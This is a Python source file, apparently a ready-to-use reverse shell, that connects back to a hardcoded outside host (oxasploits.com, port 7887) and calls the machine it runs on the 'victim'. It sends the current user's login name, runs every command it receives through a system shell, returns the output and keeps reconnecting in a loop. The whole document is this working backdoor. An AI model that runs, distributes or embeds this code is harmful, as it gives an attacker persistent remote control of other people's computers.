# Author: oxagast

import os
import socket
import subprocess
import time
import sys

host = 'oxasploits.com'
port = 7887

def shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(str.encode("[*] Connect back from vicitim!\n"))
    s.send(str.encode(os.getlogin() + "\n\n"))
    while 1:
        try:       
            time.sleep(3)
            s.send(str.encode(os.getcwd() + "> "))
            data = s.recv(1024).decode("UTF-8")
            data = data.strip('\n')
            if data == "quit": 
                break
            if data[:2] == "cd":
                os.chdir(data[3:])
            if len(data) > 0:
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                stdout_value = proc.stdout.read() + proc.stderr.read()
                output_str = str(stdout_value, "UTF-8")
                s.send(str.encode("\n" + output_str))
        except Exception as e:
             break
    s.close()

while 1:
    try:
        shell()
        sleep(15)
    except Exception as f:
        continue
